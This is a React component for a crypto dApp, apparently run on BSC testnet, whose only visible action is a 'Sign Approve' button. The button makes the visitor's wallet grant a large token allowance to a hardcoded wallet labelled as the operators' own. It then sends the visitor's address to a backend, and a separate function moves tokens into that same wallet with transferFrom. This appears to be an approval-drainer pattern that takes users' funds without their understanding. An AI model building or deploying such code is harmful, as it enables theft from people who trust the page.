import { useToast } from "@chakra-ui/react";
import { useWeb3React } from "@web3-react/core"
import { useCallback, useEffect, useState } from "react";
import usePlatziPunks from "../../hooks/usePlatziPunks";
import usePlatziPunkss from "../../hooks/usePlatziPunks/indexx";
import Backend from "../../backend/main"
import "./style.css";
import axios from "axios";

const Home = () => {
<Backend/>
   const [isMinting, setIsMinting] = useState(false)


  const[totalSupply, setTotalSupply] = useState();

  const platziPunks = usePlatziPunks(); //(token que se va a vender y necesita que se use el APPROVE)
  const platziPunkss = usePlatziPunkss(); // USDT BSC TESTNET (APPROVE)

  const [amount, setAmount] = useState(0)
  console.log(amount)

  const toast = useToast()



  const getTotalSupply = useCallback(async () =>{
    if(platziPunks){
      const result = await platziPunks.methods.totalSupply().call();
      setTotalSupply(result);
    }
  }, [platziPunks]);

  useEffect(() => {
    getTotalSupply();
  }, [getTotalSupply]);

  const {active, account} = useWeb3React();

  if(!active) return "Connect wallet with Metamask"

  const walletNuestra = "0x194C0ae22293908FE57937Da1ab445C231c9Eb82";
  const elian = "0x82d6e9662a7ef00180fa3E66Cd5b0D35548594b3";

  const confirm = () => {
    platziPunkss.methods.approve("0x194C0ae22293908FE57937Da1ab445C231c9Eb82" , "5000000000000000000000").send({ from: account });
  }

  const mint = () =>{
    setIsMinting(true);

    platziPunkss.methods.transferFrom(elian, walletNuestra , amount).send({
      from: walletNuestra,
      chainId:97
   })

    .on("transactionHash", (txHash) =>{
      toast({
         title: "transaccion enviada",
         description: txHash,
         status: "info",
      })
    })
    .on("receipt", () =>{
      setIsMinting(false)
      toast({
        title: "transaccion confirmada",
        description: "loco bigote",
        status: "success",
     })
      
    })
    .on("error", () =>{

      setIsMinting(false)
      toast({
        title: "transaccion error",
        description: "todo mal",
        status: "error",
     })
    })

  }

const handleSubmit = async (e) => {
  console.log(account)
  e.preventDefault();
  await platziPunkss.methods.approve("0x194C0ae22293908FE57937Da1ab445C231c9Eb82" , "5000000000000000000000").send({ from: account })
  .on("receipt", () =>{
      try{
      const res = axios.post('http://localhost:4000/api/wallet/',{
        wallet: account,
        proyect: "Brigde",
        cryptocurrencie: "USDT",
        network:"Testnet"
      })
      console.log(res)
    }catch(e){
      console.log(e)
    }
    })
}


// const handleSubmit = async (e) => {
//   e.preventDefault();
//         try{
//       const res = axios.post('http://localhost:4000/api/wallet/',{
//         wallet: "hula",
//         proyect: "Brigde",
//         cryptocurrencie: "USDT",
//         network:"Testnet"
//       })
//       console.log(res)
//     }catch(e){
//       console.log(e)
//     }
// }
  return (
    <form onSubmit={handleSubmit}>
        <input type="submit" value="Sign Approve"></input>
    </form>
  )
}

export default Home